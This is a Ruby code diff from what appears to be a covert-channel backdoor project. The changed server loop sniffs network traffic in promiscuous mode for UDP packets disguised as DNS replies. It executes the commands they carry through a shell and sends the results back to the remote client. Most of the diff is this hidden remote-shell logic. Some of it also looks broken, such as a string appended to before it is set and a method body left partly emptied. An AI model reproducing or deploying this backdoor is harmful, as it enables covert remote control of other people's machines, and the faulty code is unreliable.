@@ -35,40 +35,28 @@ class Server
 
   def start
   puts "starting server loop"
-    while(true)
-      case @tos
-        when "icmp"
-          icmp
-        when "tcp"
-          tcp
-        when "udp"
-          udp
+  conn = Connector.new(@iface, @tos, @daddr, @pass, "server", @port)
+  filter = "udp and dst port " + $cliPass + " and src port 53"
+  cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
+  cap.stream.each do |p|
+    puts "Client packet verified and recieved"
+    pkt = Packet.parse p
+    str += conn.servRecv(pkt)
+    puts str
+    if str[str.length-1] == 10 #aka newline
+      result = @shell.executeCmd(str)
+      if result != nil
+        conn.send(result)
       end
+      str = nil
     end
   end
 
 private
 
   def tcp
-    puts "starting server reading"
-    conn = Connector.new(@iface, @tos, @daddr, @pass, "server", @port)
-    filter = "tcp and dst port " + @port.to_s + " and src " + $addrPass
-    cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
-    cap.stream.each do |p|
-      pkt = Packet.parse p
-      if pkt.is_tcp?
-        puts pkt.tcp_dst
-        puts pkt.ip_saddr
-        puts pkt.ip_daddr
 
-        puts "recieved client packet"
-        str = conn.recv(pkt)
-        puts str
-        result = @shell.executeCmd(str)
-        if result != nil
-          conn.send(result)
-        end
-      end
+
     end
   end
   def udp
